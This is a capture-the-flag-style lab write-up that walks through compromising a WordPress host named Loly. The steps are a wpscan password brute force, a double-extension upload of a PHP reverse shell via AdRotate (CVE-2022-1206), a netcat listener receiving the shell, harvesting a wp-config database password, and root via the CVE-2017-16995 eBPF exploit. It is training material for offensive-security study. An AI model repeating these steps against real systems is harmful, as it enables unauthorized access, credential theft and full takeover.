

## Lab Details
- Difficulty: Intermediate
- OS: Linux
- Foothold time: 1 hour 30 minutes
- Privesc time: 30 minutes
- Total solve time: 2 hours

## Summary
- Initial access: Wordpress exploit
- Privilege escalation: CVE-2017-16995

## Enumeration
- Key findings: Identified open ports on target
##### Steps
- run `nmap`
```
$ nmap 192.168.55.121 -sC -sV -p- -A
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 18:35 +0000
Nmap scan report for 192.168.55.121
Host is up (0.00038s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3 (Ubuntu)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.11 - 4.9
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Foothold
- Path: Wordpress exploit

##### Steps
- run `ffuf` against target and identified endpoint `wordpress`
```
$ ffuf -u http://192.168.55.121/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
<SNIP
wordpress               [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 1ms]
<SNIP>
```
- when visit `wordpress`, web page resented the domain name add to `/etc/hosts`
![[Pasted image 20260406044529.png]]
- use `wpscan` to enumerate target wordpress
```
$ wpscan --url http://loly.lc/wordpress                                                                                                 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://loly.lc/wordpress/ [192.168.55.121]
[+] Started: Sun Apr  5 18:45:02 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.3 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://loly.lc/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://loly.lc/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://loly.lc/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5 identified (Insecure, released on 2020-08-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://loly.lc/wordpress/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.5</generator>
 | Confirmed By: Emoji Settings (Passive Detection)
 |  - http://loly.lc/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.5'

[+] WordPress theme in use: feminine-style
 | Location: http://loly.lc/wordpress/wp-content/themes/feminine-style/
 | Last Updated: 2025-04-21T00:00:00.000Z
 | Readme: http://loly.lc/wordpress/wp-content/themes/feminine-style/readme.txt
 | [!] The version is out of date, the latest version is 3.0.6
 | Style URL: http://loly.lc/wordpress/wp-content/themes/feminine-style/style.css?ver=5.5
 | Style Name: Feminine Style
 | Style URI: https://www.acmethemes.com/themes/feminine-style
 | Description: Feminine Style is a voguish, dazzling and very appealing WordPress theme. The theme is completely wo...
 | Author: acmethemes
 | Author URI: https://www.acmethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://loly.lc/wordpress/wp-content/themes/feminine-style/style.css?ver=5.5, Match: 'Version: 1.0.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] adrotate
 | Location: http://loly.lc/wordpress/wp-content/plugins/adrotate/
 | Last Updated: 2026-03-09T19:34:00.000Z
 | [!] The version is out of date, the latest version is 5.17.4
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.8.6.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://loly.lc/wordpress/wp-content/plugins/adrotate/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Apr  5 18:45:05 2026
[+] Requests Done: 188
[+] Cached Requests: 5
[+] Data Sent: 47.052 KB
[+] Data Received: 23.446 MB
[+] Memory used: 272.145 MB
[+] Elapsed time: 00:00:03

```
- identified users on target wordpress
- use `wpscan` to perfrom brute force against word press login
```
wpscan --rua --url http://loly.lc/wordpress/ -P /usr/share/wordlists/rockyou.txt
[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - loly / fernando  
```
- obtained login 
- enumerate target `wordpress` and identified `AdRotate` 
- search online and found exploit for target `AdRotate` version https://github.com/advisories/GHSA-77x6-hmg8-vxg7
- CVE-2022-1206  - Double file extension bypass 
![[Pasted image 20260406031621.png]]
- attempt to upload a file with double extension however the page shows error 
- the `php` reverse shell  payload will need to be zipped as a zipped file simply rename will not work
- upload again under `manage media` 
- fetch the payload again in browser will trigger the reverser shell code
```
http://loly.lc/wordpress/wp-content/banners/php-reverse-shell.php
```
- on local listener a shell is received as user `www-data`
```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.55] from (UNKNOWN) [192.168.55.121] 40002
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 13:10:39 up  2:55,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

```

## Lateral Movement 
- Path: CVE-2017-16995

##### Steps

## Privilege Escalation
- Path: CVE-2017-16995

##### Steps
- load and run `linpeas.sh`
- found user password `loly`
```
???????????? Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 loly www-data 3014 Aug 20  2020 /var/www/html/wordpress/wp-config.php                                                                
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );
define( 'DB_HOST', 'localhost' );
```
- run `su` and enter password, unable to find any credentials and elevated privileged as user `loly`
- check the output from `linpeas` again and found `eBPF_verifier` is highly probable 
```
??????????? Executing Linux Exploit Suggester
? https://github.com/mzet-/linux-exploit-suggester                                
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: highly probable
   Tags: [ ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic} ]
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

<SNIP>
```
- download the POC from `https://www.exploit-db.com/download/45010` and transfer to target
- compile the POC using `gcc` and run the exploit 
- returns a root shell
```
loly@ubuntu:/tmp$ gcc 45010.c -o 45010   
loly@ubuntu:/tmp$ ./45010 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff880035c1b900
[*] Leaking sock struct from ffff88003493fa40
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880079c27b40
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff880079c27b40
[*] credentials patched, launching shell...
# whoami
root
```
## Lessons Learned
- Attack family:  Wordpress, Linux Privilege Escalation
- Key takeaway:
	- Learned how to use `wpscan` to perform user login brute force
	- Learn the OffSec way of privilege escalation


## Resources
- References: